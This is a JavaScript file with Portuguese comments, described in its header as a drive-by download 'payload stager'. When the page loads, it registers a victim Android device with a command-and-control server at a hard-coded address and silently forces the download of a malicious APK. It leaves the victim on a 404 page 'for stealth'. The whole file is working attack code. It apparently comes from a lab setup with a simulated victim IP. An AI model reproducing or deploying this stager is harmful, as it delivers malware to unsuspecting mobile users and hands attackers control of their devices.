/**
 * ASCENSÃO - CULTIVO DIGITAL - Payload Stager (JavaScript)
 * Estratégia: Drive-by Download de APK
 * Objetivo: Iniciar a comunicação C2 e forçar o download do APK.
 */

// Configurações do Servidor C2 (Notebook 01)
const C2_SERVER_IP = "192.168.1.100"; 
const C2_SERVER_PORT = 8000;
const C2_BASE_URL = `http://${C2_SERVER_IP}:${C2_SERVER_PORT}/api/mobile`;

// Informações do Dispositivo (Celular 04)
const DEVICE_IP = "192.168.1.50"; // Simulação do IP da vítima na Rede Sinergia
const DEVICE_NAME = "Celular-Vítima-04";
const DEVICE_TYPE = "android-browser";

// Nome do APK que deve ser compilado e colocado na pasta 'dist/public'
const APK_FILENAME = "ASCENSAO-CULTIVO_DIGITAL_Payload-0.1-debug.apk"; 

// -----------------------------------------------------------------------------
// 1. REGISTRO DO DISPOSITIVO
// -----------------------------------------------------------------------------
async function registerDevice() {
    try {
        const response = await fetch(`${C2_BASE_URL}/register`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                device_ip: DEVICE_IP,
                device_name: DEVICE_NAME,
                device_type: DEVICE_TYPE
            })
        });

        if (!response.ok) {
            throw new Error(`Erro de registro: ${response.statusText}`);
        }

        console.log(`[C2] Dispositivo registrado com sucesso. Status: ${response.status}`);
        return true;

    } catch (error) {
        console.error(`[C2] Erro ao registrar dispositivo: ${error.message}. Verifique se o C2 está ativo em ${C2_SERVER_IP}:${C2_SERVER_PORT}`);
        return false;
    }
}

// -----------------------------------------------------------------------------
// 2. INICIAR DOWNLOAD DO APK
// -----------------------------------------------------------------------------
function initiateApkDownload() {
    console.log(`[Payload] Iniciando download do APK: ${APK_FILENAME}`);
    
    // Cria um link de download e simula o clique
    const downloadUrl = `http://${C2_SERVER_IP}:${C2_SERVER_PORT}/${APK_FILENAME}`;
    const link = document.createElement('a');
    link.href = downloadUrl;
    link.download = APK_FILENAME;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    
    console.log("[Payload] Download iniciado. Aguardando instalacao e conexao do APK.");
}

// -----------------------------------------------------------------------------
// 3. FUNÇÃO PRINCIPAL (EXECUTADA APÓS O CLIQUE)
// -----------------------------------------------------------------------------
async function mainPayloadExecution() {
    console.log("🚀 Payload Stager (JS) Ativado. Tentando conexao com C2...");

    // 1. Tenta registrar o dispositivo
    await registerDevice();

    // 2. Inicia o download do APK
    initiateApkDownload();
    
    // 3. Mantém o usuário na página 404 para maior stealth (sem redirecionamento)
    // setTimeout(() => {
        // window.location.href = "https://www.google.com/search?q=concurso+escolar+2025";
    // }, 5000);
}

// Executa o payload imediatamente após o script ser injetado/carregado
mainPayloadExecution();
